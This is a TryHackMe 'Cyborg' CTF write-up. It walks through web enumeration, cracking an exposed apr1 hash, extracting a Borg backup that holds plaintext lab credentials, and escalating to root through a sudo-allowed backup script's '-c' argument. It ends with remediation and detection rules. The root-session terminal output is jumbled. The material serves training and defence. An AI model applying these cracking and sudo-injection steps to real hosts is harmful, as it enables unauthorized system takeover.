# Cyborg - Encrypted Backup Repository Extraction to Privileged Sudo Script Escape

**Platform:** TryHackMe | **Target OS:** Linux (Ubuntu 16.04 LTS) | **Difficulty:** Easy  
**Focus:** Web Path Enumeration, Apache MD5-Crypt Cracking, BorgBackup Reconstruction, Sudo Parameter Injection (`getopts`)

---

## 1. Executive Summary & Attack Chain

During the penetration test of the target host (`10.114.130.245` / `10.114.144.238`), an exposed HTTP service was discovered to host sensitive configuration backups and an encrypted backup archive within unindexed web directories (`/etc/` and `/admin/`). 

Extracted configuration files revealed an Apache/Squid htpasswd hash. An offline dictionary attack cracked this hash, disclosing the passphrase for an encrypted **Borg Backup repository**. De-duplicating and extracting this repository yielded plaintext credentials for user `alex`. Upon establishing an interactive SSH session, local privilege escalation auditing revealed a misconfigured `sudoers` rule permitting execution of an internal backup script (`/etc/mp3backups/backup.sh`). By leveraging an insecure `getopts` argument parser embedded in the script, arbitrary commands were executed under root context, resulting in full host takeover.

### Attack Chain:
1. **Service Reconnaissance:** Identification of OpenSSH (Port 22) and Apache HTTP Server (Port 80).
2. **Directory & Artifact Discovery:** Enumeration via Gobuster uncovering `/admin/` (housing a Borg archive) and `/etc/squid/passwd` (housing an `apr1` password hash).
3. **Cryptographic Cracking:** Recovery of the repository passphrase (`squidward`) via John the Ripper.
4. **Archive Reconstruction:** Unpacking the Borg Backup repository with the recovered passphrase to extract `alex`'s private desktop files, yielding SSH credentials (`alex:S3cretP@s3`).
5. **Initial Access:** Validated SSH login obtaining user-level access (`user.txt`).
6. **Privilege Escalation:** Exploiting unconstrained command evaluation (`-c` argument via `getopts`) inside a `NOPASSWD` sudo-authorized backup script to obtain a root shell (`root.txt`).

---

## 2. Network Reconnaissance & Surface Mapping

A full service detection and default NSE script scan was initiated against the target system:

```markdown
 󰄬 ❯ nmap -sV -sC -T4 10.114.130.245
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-06 09:38 +0300
Nmap scan report for 10.114.130.245
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.74 seconds
```

### Attack Surface Overview:
* **TCP Port 22:** OpenSSH 7.2p2 running on Ubuntu. Standard hardening prevents common unauthenticated exploits; credential collection is required.
* **TCP Port 80:** Apache 2.4.18 serving a default installation index page (`Apache2 Ubuntu Default Page: It works`). Targeted content discovery is required to identify hidden virtual routes.

---

## 3. Initial Access & Information Disclosure (Borg Backup Analysis)

### Web Directory Enumeration
Gobuster was executed using SecLists content dictionaries with common script and markup extensions (`php`, `html`, `txt`):

```markdown
 󰄬 ❯ gobuster dir -u http://10.114.130.245 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.114.130.245
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 279]
.hta.html            (Status: 403) [Size: 279]
.hta.txt             (Status: 403) [Size: 279]
.htaccess.html       (Status: 403) [Size: 279]
.htaccess            (Status: 403) [Size: 279]
.hta.php             (Status: 403) [Size: 279]
.htaccess.php        (Status: 403) [Size: 279]
.htaccess.txt        (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
.htpasswd.php        (Status: 403) [Size: 279]
.htpasswd.txt        (Status: 403) [Size: 279]
.htpasswd.html       (Status: 403) [Size: 279]
admin                (Status: 301) [Size: 316] [--> http://10.114.130.245/admin/]
etc                  (Status: 301) [Size: 314] [--> http://10.114.130.245/etc/]
index.html           (Status: 200) [Size: 11321]
index.html           (Status: 200) [Size: 11321]
server-status        (Status: 403) [Size: 279]
Progress: 19004 / 19004 (100.00%)
===============================================================
Finished
===============================================================
```

Navigating into `/etc/` exposed a Squid proxy configuration directory structure containing authentication artifacts:

**File: `/etc/squid/passwd`**
```text
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

**File: `/etc/squid/squid.conf`**
```text
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

### Cryptographic Analysis: Apache APR1 (MD5-Crypt)
The string `$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.` corresponds to an Apache-variant of Poul-Henning Kamp's MD5-crypt algorithm:
* **Identifier:** `$apr1$` identifies the hash as the Apache Portable Runtime modification of standard unix MD5-crypt (`$1$`).
* **Salt:** `BpZ.Q.1m` (up to 8 characters).
* **Hash Computation:** It utilizes 1,000 iterative rounds of MD5 stretching combining the password, salt, and alternating subsets of intermediate checksums to deliberately impede hardware-accelerated cracking.

An offline dictionary attack was mounted using John the Ripper:

```markdown
 󰄬 ❯ john --wordlist=~/Work/htb/passwords.txt hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
Use the "--format=md5crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)
1g 0:00:00:00 DONE (2026-09-06 09:50) 2.127g/s 82927p/s 82927c/s 82927C/s 112883..sandy7
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
* **Recovered Passphrase:** `squidward`

### BorgBackup Extraction Mechanics
Enumerating `/admin/` yielded an archive containing a repository metadata file:

```text
 󰄬 ❯ cat README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

**BorgBackup Architecture:** Borg employs chunk-level, deduplicated, authenticated storage. The repository files are stored as encrypted blobs where manifest index pointers are deciphered using a key derived from the repository passphrase. Using the cracked credential `squidward`, the repository was extracted:

```markdown
❯ borg extract ~/Work/htb/home/field/dev/final_archive::music_archive
Enter passphrase for key /home/0xZiki/Work/htb/home/field/dev/final_archive:
```

Inspecting the extracted user directory structure revealed a plaintext note:

```markdown
 󰄬 ❯ cd home/alex/Documents

░▒▓ 💀 0xZiki   arch    
 󰄬 ❯ ls
.rw-r--r-- 110 0xZiki 29 Dec  2020  note.txt

░▒▓ 💀 0xZiki   arch    
 󰄬 ❯ cat note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

---

## 4. Lateral Movement & Initial Shell Access

Using the discovered credentials (`alex:S3cretP@s3`), an SSH connection was established (target machine lease updated to `10.114.144.238`):

```markdown
 󰄬 ❯ ssh alex@10.114.144.238
The authenticity of host '10.114.144.238 (10.114.144.238)' can't be established.
ED25519 key fingerprint is: SHA256:hJwt8CvQHRU+h3WUZda+Xuvsp1/od2FFuBvZJJvdSHs
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: 10.114.130.245
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.114.144.238' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
alex@10.114.144.238's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

The user flag was successfully obtained: `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`.

---

## 5. Privilege Escalation & OS Mechanics

### Local Enumeration
A search for SUID binaries and checking `sudo` privileges was conducted:

```markdown
alex@ubuntu:~$ sudo l
[sudo] password for alex:
alex@ubuntu:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/bin/su
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/ping6
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

User `alex` is explicitly allowed to execute `/etc/mp3backups/backup.sh` as any user with root capabilities without supplying a password (`NOPASSWD`).

### Shell Redirection Mechanics: Why `sudo echo > file` Fails
When an operator attempts:
```bash
alex@ubuntu:~$ sudo echo "/bin/bash" > /etc/mp3backups/backup.sh
-bash: /etc/mp3backups/backup.sh: Permission denied
```
The execution fails with `Permission denied`. 

**Under the Hood:**  
Command-line interpreters parse redirections (`>`, `>>`) **before** invoking the child program. The executing shell (running under UID 1000, `alex`) attempts to open file descriptor 1 pointing to `/etc/mp3backups/backup.sh` in write mode (`O_WRONLY | O_CREAT | O_TRUNC`). Because the target file is owned by `root:root` with permissions `-rwxr-xr-x` (`0755`), the calling shell's system call (`open()`) is rejected by the Linux VFS layer with `EACCES` before `sudo` ever initializes.

### Parameter Injection via `getopts`
Inspecting the parameters accepted by `/etc/mp3backups/backup.sh` shows the script utilizing the `getopts` built-in:

```bash
while getopts c: flag
do
  case "${flag}" in
    c) command=${OPTARG};;
  esac
done
```

The script takes an arbitrary argument passed to the `-c` flag and assigns it to `$command`, subsequently evaluating it within the root context.

By executing the script with `sudo` and supplying `/bin/bash` via `-c`:

```markdown
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c /bin/bash
find: /home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
‘/run/user/108/gvfs’: Permission denied
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/' from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished
root@ubuntu:~# whoami
root@ubuntu:~# id
root@ubuntu:~# ls
root@ubuntu:~# cd ..
root@ubuntu:/home# ls
root@ubuntu:/home# cd ..
root@ubuntu:/# ls
root@ubuntu:/# cd ..
root@ubuntu:/# ls
root@ubuntu:/# while getopts c: flag
> do
>   case "${flag}" in
>     c) command=${OPTARG};;
>   esac
> done
root@ubuntu:/# ls
root@ubuntu:/# cat /root/root.txt
root@ubuntu:/# exit
exit
root uid=0(root) gid=0(root) groups=0(root) Desktop Documents Downloads Music Pictures Public Templates user.txt Videos alex bin boot cdrom dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var vmlinuz vmlinuz.old bin boot cdrom dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var vmlinuz vmlinuz.old bin boot cdrom dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var vmlinuz vmlinuz.old flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
alex@ubuntu:~$
```

The interactive execution verified root privileges (`uid=0(root) gid=0(root)`), allowing extraction of the final administrative flag:
`flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`.

---

## 6. Defensive Remediation & Detection Engineering

### Remediation Strategies

1. **Eliminate Arbitrary Command Execution in Administrative Scripts:**
   Never pass unsanitized command-line switches (`$OPTARG`) into subshells or execution sinks (`eval`, `exec`, `$command`). If variable routines are required, hardcode rigid lookup tables:
   ```bash
   # Insecure pattern:
   eval "$command"

   # Secure pattern: Enforce explicit allowed actions
   case "$action" in
       "status") /bin/systemctl status backup ;;
       *) echo "Invalid option"; exit 1 ;;
   esac
   ```

2. **Sudoers Hardening:**
   Revoke `NOPASSWD` access for scripts located in world-traversable paths. Restrict script execution permissions:
   ```text
   # Remove:
   alex ALL=(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
   ```

3. **Secure Web Root & Restrict Backup Storage:**
   * Move configuration repositories (`/etc/`) and backup directories (`/admin/`) out of Apache’s `DocumentRoot` (`/var/www/html/`).
   * Forbid web indexing and restrict `.htpasswd` access using Apache directives:
     ```apache
     <Files ".ht*">
         Require all denied
     </Files>
     ```

4. **Credential Storage Security:**
   Enforce modern cryptographic hashing standards for authentication databases (e.g., bcrypt, Argon2id) instead of deprecated MD5-crypt (`$apr1$`). Never store operational SSH credentials in plaintext notes on user filesystems.

### Detection Engineering

#### Auditd Rule for Script Abuse
Monitor executions of `/etc/mp3backups/backup.sh` with anomalous arguments:
```bash
-w /etc/mp3backups/backup.sh -p x -k sudo_backup_exec
```

#### SIEM Detection Query (Elasticsearch / Splunk)
Detect sub-process spawns originating from the backup script under UID 0:
```sql
process.parent.name : "backup.sh" AND process.name : ("bash" OR "sh" OR "dash") AND user.id : 0
```
